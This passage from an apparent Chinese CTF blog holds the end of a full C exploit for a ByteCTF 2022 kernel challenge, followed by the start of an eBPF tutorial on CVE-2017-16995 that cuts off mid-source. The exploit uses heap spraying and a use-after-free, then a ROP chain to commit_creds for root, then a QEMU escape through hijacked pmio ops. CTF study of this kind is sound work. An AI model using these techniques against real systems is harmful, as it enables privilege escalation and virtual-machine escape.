printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    // system(&quot;/bin/sh&quot;);    qemu_escape();&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            if (i / 2 &lt; 10)            &#123;                printf(&quot;%d  &quot;, i / 2);            &#125;            else if (i / 2 &lt; 100)            &#123;                printf(&quot;%d &quot;, i / 2);            &#125;            else            &#123;                printf(&quot;%d&quot;, i / 2);            &#125;        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;unsigned long kernel_addr;unsigned long kernel_base;unsigned long kernel_offset;int fd;int qemu_escape()&#123;    int fd = open(&quot;/dev/bytedev&quot;, 2);    if (fd &lt; 0)    &#123;        printf(&quot;open bytedev failed\\n&quot;);        exit(1);    &#125;    char *buf = malloc(0x1000);    char *fake_ops = malloc(0x1000);    puts(&quot;\\n\\033[34m\\033[1m[*] leak process base\\033[0m&quot;);    ioctl(fd, 0x114514, 1);    ioctl(fd, 0x1919810, -25);    read(fd, buf, 0x8);    uint64_t elf_base = *(uint64_t *)buf - 0x474039;    uint64_t system_addr = elf_base + 0x2e0250;    uint64_t pmio_read_addr = elf_base + 0x474039;    printf(&quot;\\033[32m\\033[1m[+] process base: \\033[0m %p\\n&quot;, elf_base);    printf(&quot;\\033[32m\\033[1m[+] system addr: \\033[0m %p\\n&quot;, system_addr);    read(fd, fake_ops, 0x100);    puts(&quot;&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] leak heap base\\033[0m&quot;);    ioctl(fd, 0x1919810, -0x186);    read(fd, buf, 0x8);    uint64_t heap_base = *(uint64_t *)buf - 0x2ae00;    uint64_t parent_object = heap_base + 0x9f650;    uint64_t opaque_addr = heap_base + 0x10adc20;    uint64_t pmio_ops_addr = opaque_addr + 0xb68;    printf(&quot;\\033[32m\\033[1m[+] heap base: \\033[0m %p\\n&quot;, heap_base);    printf(&quot;\\033[32m\\033[1m[+] parent_object addr: \\033[0m %p\\n&quot;, parent_object);    printf(&quot;\\033[32m\\033[1m[+] opaque addr: \\033[0m %p\\n&quot;, opaque_addr);    puts(&quot;&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] leak libc base\\033[0m&quot;);    ioctl(fd, 0x1919810, -388);    read(fd, buf, 0x8 * 0x8);    uint64_t libc_base = *(uint64_t *)(buf + 0x7 * 8) - 0x4385f0;    uint64_t mov_rsp_rbx = 0x5b4d0 + libc_base;    // mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];    uint64_t magic_gadget = 0x0000000000151990 + libc_base;    uint64_t pop_rdi = 0x0000000000023b6a + libc_base;    printf(&quot;\\033[32m\\033[1m[+] libc base: \\033[0m %p\\n&quot;, libc_base);    printf(&quot;\\033[32m\\033[1m[+] magic gadget addr: \\033[0m %p\\n&quot;, magic_gadget);    char *command = &quot;nl flag\\x00&quot;;    uint64_t command_addr = opaque_addr + 0xf8;    puts(&quot;&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] prepare for hijake pmio-&gt;ops\\033[0m&quot;);    // ioctl(fd, 0x1919810, -0x16d);    // read(fd, buf, 0x200);    ioctl(fd, 0x1919810, -0x18);    read(fd, buf, 0x200);    *(uint64_t *)(buf + 8) = opaque_addr + 0x100 - 0x20;    *(uint64_t *)(buf + 0xe0) = pop_rdi;    *(uint64_t *)(buf + 0xe8) = command_addr;    *(uint64_t *)(buf + 0xf0) = system_addr;    *(uint64_t *)(buf + 0xf8) = *(uint64_t *)command;    *(uint64_t *)(buf + 0x100) = mov_rsp_rbx;    write(fd, buf, 0x108);    ioctl(fd, 0x1919810, -0x16d);    ioctl(fd, 0x1919810, -6);    read(fd, buf, 0x200);    *(uint64_t *)(fake_ops) = pmio_read_addr;    *(uint64_t *)(fake_ops + 8) = magic_gadget;    for (int i = 0; i &lt; 0x10; i++)    &#123;        *(uint64_t *)(buf + 0x30 + i * 8) = *(uint64_t *)(fake_ops + i * 8);    &#125;    write(fd, buf, 0x100);    printf(&quot;\\033[32m\\033[1m[+] ready to hijack! \\033[0m\\n&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] hijake pmio-&gt;ops\\033[0m&quot;);    memset(buf, 0, 0x1000);    ioctl(fd, 0x1919810, -347);    read(fd, buf, 0x200);    *(uint64_t *)(buf + 0x48) = opaque_addr + 0xc28;    write(fd, buf, 0x50);    ioctl(fd, 0x1919810, 0x196082);    // ioctl(fd, 0x1919810,);    printf(&quot;\\033[32m\\033[1m[+] done! \\033[0m\\n&quot;);    return 0;&#125;int main()&#123;    save_status();    signal(SIGSEGV, get_shell);    char *buf = malloc(0x4000);    unsigned long *point_buf = malloc(0x4000);    int victim_qid = -1;    int sk_sockets[SOCKET_NUM][2];    int msqid[MSG_QUEUE_NUM];    char fake_secondary_msg[704];    struct msg_msg *nearby_msg;    struct msg_msg *nearby_msg_prim;    unsigned long victim_addr;    unsigned long real_qid;    unsigned long search_addr;    struct pipe_buffer *pipe_buf_ptr;    int pipe_fd[PIPE_NUM][2];    struct pipe_buf_operations *ops_ptr;    unsigned long *rop_chain = malloc(0x2000);    cpu_set_t cpu_set;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) &lt; 0)        &#123;            errExit(&quot;failed to create socket pair!&quot;);        &#125;    &#125;    fd = open(&quot;/dev/bytedev&quot;, 2);    if (fd &lt; 0)    &#123;        printf(&quot;open bytedev failed\\n&quot;);        exit(1);    &#125;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) &lt; 0)            errExit(&quot;failed to create msg_queue!&quot;);    &#125;    CPU_ZERO(&amp;cpu_set);    CPU_SET(0, &amp;cpu_set);    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);    puts(&quot;\\n\\033[34m\\033[1m[*] spray msg_msg, construct overlapping object\\033[0m&quot;);    memset(&amp;primary_msg, 0, sizeof(primary_msg));    memset(&amp;secondary_msg, 0, sizeof(secondary_msg));    *(long *)&amp;primary_msg = PRIMARY_MSG_TYPE;    *(long *)&amp;secondary_msg = SECONDARY_MSG_TYPE;    *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;    *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;        *(int *)&amp;primary_msg.mtext[4] = i;        if (msgsnd(msqid[i], &amp;primary_msg,                   sizeof(primary_msg) - 8, 0) &lt; 0)        &#123;            errExit(&quot;failed to send primary msg!&quot;);        &#125;        *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;        *(int *)&amp;secondary_msg.mtext[4] = i;        if (msgsnd(msqid[i], &amp;secondary_msg,                   sizeof(secondary_msg) - 8, 0) &lt; 0)        &#123;            errExit(&quot;failed to send secondary msg!&quot;);        &#125;    &#125;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i += 1024)    &#123;        if (msgrcv(msqid[i], &amp;primary_msg, sizeof(primary_msg) - 8, PRIMARY_MSG_TYPE, 0) &lt; 0)        &#123;            errExit(&quot;failed to receive primary msg!&quot;);        &#125;    &#125;    memset(buf, 0x84, 0x1000);    write(fd, buf, 0xffc);    read(fd, buf, 0xffc);    memset(buf, 0, 0x1000);    *(unsigned short *)buf = 0xffd;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], buf, 0x1000 - 0x140) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    memset(buf, 0xa0, 0x1000);    write(fd, buf, 1);    victim_qid = real_qid = -1;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        if (i % 256 == 0)        &#123;            continue;        &#125;        if (msgrcv(msqid[i], &amp;secondary_msg, sizeof(secondary_msg) - 8, 1, MSG_COPY | IPC_NOWAIT) &lt; 0)        &#123;            errExit(&quot;failed to receive secondary msg!&quot;);        &#125;        if (*(int *)&amp;secondary_msg.mtext[0] != MSG_TAG)        &#123;            errExit(&quot;failed to make corruption!&quot;);        &#125;        if (*(int *)&amp;secondary_msg.mtext[4] != i)        &#123;            victim_qid = i;            real_qid = *(int *)&amp;secondary_msg.mtext[4];            break;        &#125;    &#125;    if (victim_qid &lt; 0)    &#123;        errExit(&quot;failed to make overlapping!&quot;);    &#125;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], buf, 0x1000 - 0x140) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    printf(&quot;\\033[32m\\033[1m[+] victim qid:\\033[0m %d &quot;, victim_qid);    printf(&quot;\\033[32m\\033[1m real qid: \\033[0m %d\\n&quot;, real_qid);    if (msgrcv(msqid[real_qid], &amp;secondary_msg, sizeof(secondary_msg) - 8, SECONDARY_MSG_TYPE, 0) &lt; 0)    &#123;        errExit(&quot;failed to release secondary msg!&quot;);    &#125;    puts(&quot;\\033[32m\\033[1m[+] UAF construction complete!\\033[0m&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] spray sk_buff to leak kheap addr\\033[0m&quot;);    memset(fake_secondary_msg, &#x27;Z&#x27;, sizeof(fake_secondary_msg));    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = 0x196082;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = 0x196082;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 0x1000 - sizeof(struct msg_msg);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;oob_msg, sizeof(oob_msg) - 8, 1, MSG_COPY | IPC_NOWAIT) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    if (*(int *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)    &#123;        errExit(&quot;failed to rehit the UAF object!&quot;);    &#125;    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - sizeof(struct msg_msg))];    printf(&quot;\\033[32m\\033[1m[+] addr of primary msg of msg nearby victim: \\033[0m%p\\n&quot;,           nearby_msg-&gt;m_list.prev);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    search_addr = (unsigned long long *)nearby_msg-&gt;m_list.prev;    search_addr = search_addr - 8;    memset(oob_msg.mtext, 0, sizeof(oob_msg.mtext));    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = sizeof(oob_msg.mtext);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;oob_msg, sizeof(oob_msg), 1, MSG_COPY | IPC_NOWAIT) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    if (*(int *)&amp;oob_msg.mtext[0x1000] != MSG_TAG)    &#123;        errExit(&quot;failed to rehit the UAF object!&quot;);    &#125;    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];    victim_addr = (unsigned long *)(nearby_msg_prim-&gt;m_list.next);    victim_addr = victim_addr - 0x400;    printf(&quot;\\033[32m\\033[1m[+] addr of msg UAF object: \\033[0m%p\\n&quot;, victim_addr);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] spray pipe_buffer to leak kernel base\\033[0m&quot;);    for (int i = 0; i &lt; 704 / 8; i++)    &#123;        ((unsigned long long *)fake_secondary_msg)[i] = victim_addr;    &#125;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + 0x200;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + 0x200;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 1024 - 0x30;    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;secondary_msg, sizeof(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    for (int i = 0; i &lt; PIPE_NUM; i++)    &#123;        if (pipe(pipe_fd[i]) &lt; 0)            errExit(&quot;failed to create pipe!&quot;);        if (write(pipe_fd[i][1], &quot;196082&quot;, 6) &lt; 0)            errExit(&quot;failed to write the pipe!&quot;);    &#125;    memset(fake_secondary_msg, 0, sizeof(fake_secondary_msg));    pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], &amp;fake_secondary_msg,                     sizeof(fake_secondary_msg)) &lt; 0)                errExit(&quot;failed to release sk_buff!&quot;);            if (pipe_buf_ptr-&gt;ops &gt; 0xffffffff81000000)            &#123;                printf(&quot;\\033[32m\\033[1m[+] got pipe_buf_ops: \\033[0m%p\\n&quot;,                       pipe_buf_ptr-&gt;ops);                kernel_addr = pipe_buf_ptr-&gt;ops;                kernel_offset = kernel_addr - 0xffffffff81e2d980;                kernel_base = kernel_offset + 0xffffffff81000000;            &#125;        &#125;    &#125;    printf(&quot;\\033[32m\\033[1m[+] kernel base: \\033[0m%p \\033[32m\\033[1moffset: \\033[0m%p\\n&quot;,           kernel_base, kernel_offset);    puts(&quot;\\n\\033[34m\\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\\033[0m&quot;);    unsigned long long init_cred = 0xffffffff8224aca0 + kernel_offset;    unsigned long long commit_creds = 0xffffffff810bb710 + kernel_offset;    unsigned long long pop_rdi = 0xffffffff811af57d + kernel_offset;    unsigned long long swapgs_iretq = 0xffffffff81a010eb + kernel_offset;    unsigned long long push_rsi_pop_rsp_rbx_r12 = 0xffffffff8133151b + kernel_offset;    pipe_buf_ptr-&gt;page = *(uint64_t *)&quot;196082&quot;;    pipe_buf_ptr-&gt;ops = victim_addr + 0x100;    *(uint64_t *)(fake_secondary_msg + 0x18) = 0xffffffff81000390 + kernel_offset;    ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[0x100];    ops_ptr-&gt;release = push_rsi_pop_rsp_rbx_r12;    int rop = 0;    rop_chain = (uint64_t *)&amp;fake_secondary_msg[0x20];    rop_chain[rop++] = pop_rdi;    rop_chain[rop++] = init_cred;    rop_chain[rop++] = commit_creds;    rop_chain[rop++] = swapgs_iretq;    rop_chain[rop++] = get_shell;    rop_chain[rop++] = user_cs;    rop_chain[rop++] = user_rflags;    rop_chain[rop++] = user_sp;    rop_chain[rop++] = user_ss;    printf(&quot;rop_chain is ready\\n&quot;);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    read(fd, buf, 0xffc);    printf(&quot;spray sk_buff complete!\\n&quot;);    for (int i = 0; i &lt; PIPE_NUM; i++)    &#123;        close(pipe_fd[i][0]);        close(pipe_fd[i][1]);    &#125;    return 0;&#125;\n\n\n吐槽一下：一道题目用了五个gadget文件！！！\n➜  ctf ls -l | grep gadget-rw-r--r--   1 tcdy  staff   14478379  3 29 19:14 gadget.txt-rw-rw-r--@  1 tcdy  staff  325376514  3 29 19:24 gadget2.txt-rw-rw-r--@  1 tcdy  staff  113547117  3 30 13:43 gadget3.txt-rw-rw-r--@  1 tcdy  staff   21718691  3 30 14:38 gadget4.txt-rw-r--r--   1 tcdy  staff    4499639  3 30 15:08 gadget5.txt\n\n\n参考链接:    https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/    https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068题目链接:    墨晚鸢佬自己有题目链接，这里就不上传啦。\n","categories":["比赛复现"],"tags":["msg_msg","sk_buff","pipe_buffer","qemu escape"]},{"title":"CVE-2017-16995","url":"/2022/10/10/CVE-2017-16995/","content":"这一篇是作为ebpf的入门文章，所以会稍微介绍一下指令集，寄存器。可能篇幅略长。\n漏洞简介该漏洞最早是由17年12月21号Google Project Zero团队的Jann Horn发现并报告的，编号为CVE-2017-16995。内核影响版本：Linux Kernel Version 4.14 ~ 4.4 。\neBPF指令集介绍在认识一个新的指令集的第一步就是认识寄存器，在eBPF中存在十一个寄存器：\nR0：一般用来表示函数返回值，包括整个 BPF 代码块（其实也可被看做一个函数）的返回值；R1~R5：一般用于表示内核预设函数的参数；R6~R9：在 BPF 代码中可以作存储用，其值不受内核预设函数影响；R10：只读，用作栈指针(SP)可理解对应为物理寄存器为：\t\tR0 – rax    R1 - rdi    R2 - rsi    R3 - rdx    R4 - rcx    R5 - r8    R6 - rbx    R7 - r13    R8 - r14    R9 - r15    R10 – rbp\n\n对于算数(ALU)和跳转(JMP)指令，8bit的代码字段分为三个部分：\n+----------------+--------+--------------------+|   4 bits       |  1 bit |   3 bits           || operation code | source | instruction class  |+----------------+--------+--------------------+(MSB)                                      (LSB)\n\n这里最后3bit LSB代表指令类型：    \neBPF classes: BPF_LD    0x00 BPF_LDX   0x01 BPF_ST    0x02 BPF_STX   0x03 BPF_ALU   0x04 BPF_JMP   0x05 BPF_JMP32 0x06 BPF_ALU64 0x07\n\n当BPF_CLASS(code) == BPF_ALU or BPF_JMP时,第四bit编码源操作数：\nBPF_K     0x00 ；代表将立即数作为源操作数BPF_X     0x08 ；代表将‘src_reg’作为源操作数\n\n前4bit的MSB用来存储操作码：\n\n如果 BPF_CLASS(code) == BPF_ALU or BPF_ALU64时，操作码会是下面的一个：\n\nBPF_ADD   0x00BPF_SUB   0x10BPF_MUL   0x20BPF_DIV   0x30BPF_OR    0x40BPF_AND   0x50BPF_LSH   0x60BPF_RSH   0x70BPF_NEG   0x80BPF_MOD   0x90BPF_XOR   0xa0BPF_MOV   0xb0  /* eBPF only: mov reg to reg */BPF_ARSH  0xc0  /* eBPF only: sign extending shift right */BPF_END   0xd0  /* eBPF only: endianness conversion */\n\n\n如果BPF_CLASS(code) == BPF_JMP or BPF_JMP32时，操作码将会是下面的一个：\n\nBPF_JA    0x00  /* BPF_JMP only */BPF_JEQ   0x10BPF_JGT   0x20BPF_JGE   0x30BPF_JSET  0x40BPF_JNE   0x50  /* eBPF only: jump != */BPF_JSGT  0x60  /* eBPF only: signed &#x27;&gt;&#x27; */BPF_JSGE  0x70  /* eBPF only: signed &#x27;&gt;=&#x27; */BPF_CALL  0x80  /* eBPF BPF_JMP only: function call */BPF_EXIT  0x90  /* eBPF BPF_JMP only: function return */BPF_JLT   0xa0  /* eBPF only: unsigned &#x27;&lt;&#x27; */BPF_JLE   0xb0  /* eBPF only: unsigned &#x27;&lt;=&#x27; */BPF_JSLT  0xc0  /* eBPF only: signed &#x27;&lt;&#x27; */BPF_JSLE  0xd0  /* eBPF only: signed &#x27;&lt;=&#x27; */\n\n比如 BPF_ADD | BPF_X | BPF_ALU这条指令代表32位加法运算，将源寄存器的值加上目的寄存器的值，然后将结果存储到目的寄存器中：dst_reg = (u32) dst_reg + (u32) src_reg;\n并且，在eBPF指令集中没有了BPF_RET指令，用BPF_JMP | BPF_EXIT仅代替函数执行完退出，在函数退出之前，eBPF需要将返回值存储在R0中。\n对于加载（LOAD）和存储(STORE)指令，8-bit的代码域分为：\n+--------+--------+-------------------+| 3 bits | 2 bits |   3 bits          ||  mode  |  size  | instruction class |+--------+--------+-------------------+(MSB)                             (LSB)\n\n其中size分别有下面四种类型：\nBPF_W   0x00   ; word 4 byteBPF_H   0x08   ; half word 2 byteBPF_B   0x10   ; byte BPF_DW  0x18   ; double word 8 byte\n\n并且在内核中，每一条指令的信息都储存在bpf_insn结构体中：\nstruct bpf_insn &#123;    __u8    code;       /* opcode */    __u8    dst_reg:4;  /* dest register */    __u8    src_reg:4;  /* source register */    __s16   off;        /* signed offset */    __s32   imm;        /* signed immediate constant */&#125;;\n\neBPF代码加载执行流程 &amp; 检查分析加载执行流程用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件来（如往socket写数据）来触发内核执行用户提供的eBPF代码。eBPF模块可以让用户加载数据包过滤代码（eBPF代码）进入内核，在收到数据包时触发eBPF代码执行。可以编写一个简单的用户数据包过滤程序来触发执行eBPF代码，具体流程如下：\n* syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr)) ；创建全局变量map结构体，内核态用户态都可以访问。* syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr)) ；将用户态的BPF代码注入到内核，并对代码进行检查，并模拟执行。    * static int bpf_prog_load(union bpf_attr *attr) ；判断过滤模式        * int bpf_check(struct bpf_prog **prog, union bpf_attr *attr)            * check_cfg(env); 第一轮检查，检查是否存在环路            * do_check(env);  第二轮检查，详细扫描BPF代码的运行过程，跟踪分析寄存器和堆栈，检查是否有不符合规则的情况出现    * static unsigned int __bpf_prog_run(void *ctx, const struct bpf_insn *insn)；运行BPF指令，最后真正运行的的函数。* setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd))；将eBPF与特定的事件绑定，在收到数据包时触发eBPF代码执行。\n\n检查分析根据上述流程我们可以看到我们将BPF代码注入到内核中是发生在第二步中的，执行的函数为：bpf_prog_load\nstatic int bpf_prog_load(union bpf_attr *attr)&#123;  enum bpf_prog_type type = attr-&gt;prog_type;  struct bpf_prog *prog;  int err;  char license[128];  bool is_gpl;  if (CHECK_ATTR(BPF_PROG_LOAD))    return -EINVAL;  /* copy eBPF program license from user space */  if (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),                        sizeof(license) - 1) &lt; 0)    return -EFAULT;  license[sizeof(license) - 1] = 0;  /* eBPF programs must be GPL compatible to use GPL-ed functions */  is_gpl = license_is_gpl_compatible(license);  if (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS)    return -EINVAL;  if (type == BPF_PROG_TYPE_KPROBE &amp;&amp;      attr-&gt;kern_version != LINUX_VERSION_CODE)    return -EINVAL;  if (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN))    return -EPERM;  /* plain bpf_prog allocation */  prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);  if (!prog)    return -ENOMEM;  err = bpf_prog_charge_memlock(prog);  if (err)    goto free_prog_nouncharge;  prog-&gt;len = attr-&gt;insn_cnt;  err = -EFAULT;  if (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns),                     prog-&gt;len * sizeof(struct bpf_insn)) != 0)    goto free_prog;  prog-&gt;orig_prog = NULL;  prog-&gt;jited = 0;  atomic_set(&amp;prog-&gt;aux-&gt;refcnt, 1);  prog-&gt;gpl_compatible = is_gpl ? 1 : 0;  /* find program type: socket_filter vs tracing_filter */  err = find_prog_type(type, prog);  if (err &lt; 0)    goto free_prog;  /* run eBPF verifier */  err = bpf_check(&amp;prog, attr);  if (err &lt; 0)    goto free_used_maps;  /* fixup BPF_CALL-&gt;imm field */  fixup_bpf_calls(prog);  /* eBPF program is ready to be JITed */  err = bpf_prog_select_runtime(prog);  if (err &lt; 0)    goto free_used_maps;  err = bpf_prog_new_fd(prog);  if (err &lt; 0)    /* failed to allocate fd */    goto free_used_maps;  return err;  free_used_maps:  free_used_maps(prog-&gt;aux);  free_prog:  bpf_prog_uncharge_memlock(prog);  free_prog_nouncharge:  bpf_prog_free(prog);  return err;&#125;\n\n可以看到在19行对ebpf license进行验证是否为GPL证书的一种，在21行检验了传入代码的长度，然后通过find_prog_type函数判断过滤模式，其中socket_filter是数据包过滤，而tracing_filter就是对系统调用号及参数的过滤，也就是我们常见的seccomp。最后进入bpf_check函数进行进一步验证。\nint bpf_check(struct bpf_prog **prog, union bpf_attr *attr)&#123;  char __user *log_ubuf = NULL;  struct verifier_env *env;  int ret = -EINVAL;  if ((*prog)-&gt;len &lt;= 0 || (*prog)-&gt;len &gt; BPF_MAXINSNS)    return -E2BIG;  /* &#x27;struct verifier_env&#x27; can be global, but since it&#x27;s not small,\t * allocate/free it every time bpf_check() is called\t */  env = kzalloc(sizeof(struct verifier_env), GFP_KERNEL);  if (!env)    return -ENOMEM;  env-&gt;prog = *prog;  /* grab the mutex to protect few globals used by verifier */  mutex_lock(&amp;bpf_verifier_lock);  if (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;    /* user requested verbose verifier output\t\t * and supplied buffer to store the verification trace\t\t */    log_level = attr-&gt;log_level;    log_ubuf = (char __user *) (unsigned long) attr-&gt;log_buf;    log_size = attr-&gt;log_size;    log_len = 0;    ret = -EINVAL;    /* log_* values have to be sane */    if (log_size &lt; 128 || log_size &gt; UINT_MAX &gt;&gt; 8 ||        log_level == 0 || log_ubuf == NULL)      goto free_env;    ret = -ENOMEM;    log_buf = vmalloc(log_size);    if (!log_buf)      goto free_env;  &#125; else &#123;    log_level = 0;  &#125;  ret = replace_map_fd_with_map_ptr(env);  if (ret &lt; 0)    goto skip_full_check;  env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,                                 sizeof(struct verifier_state_list *),                                 GFP_USER);  ret = -ENOMEM;  if (!env-&gt;explored_states)    goto skip_full_check;  ret = check_cfg(env);  if (ret &lt; 0)    goto skip_full_check;  env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);  ret = do_check(env);  skip_full_check:  while (pop_stack(env, NULL) &gt;= 0);  free_states(env);  if (ret == 0)    /* program is valid, convert *(u32*)(ctx + off) accesses */    ret = convert_ctx_accesses(env);  if (log_level &amp;&amp; log_len &gt;= log_size - 1) &#123;    BUG_ON(log_len &gt;= log_size);    /* verifier log exceeded user supplied buffer */    ret = -ENOSPC;    /* fall through to return what was recorded */  &#125;  /* copy verifier log back to user space including trailing zero */  if (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + 1) != 0) &#123;    ret = -EFAULT;    goto free_log_buf;  &#125;  if (ret == 0 &amp;&amp; env-&gt;used_map_cnt) &#123;    /* if program passed verifier, update used_maps in bpf_prog_info */    env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,                                              sizeof(env-&gt;used_maps[0]),                                              GFP_KERNEL);    if (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;      ret = -ENOMEM;      goto free_log_buf;    &#125;    memcpy(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,           sizeof(env-&gt;used_maps[0]) * env-&gt;used_map_cnt);    env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;    /* program is valid. Convert pseudo bpf_ld_imm64 into generic\t\t * bpf_ld_imm64 instructions\t\t */    convert_pseudo_ld_imm64(env);  &#125;  free_log_buf:  if (log_level)    vfree(log_buf);  free_env:  if 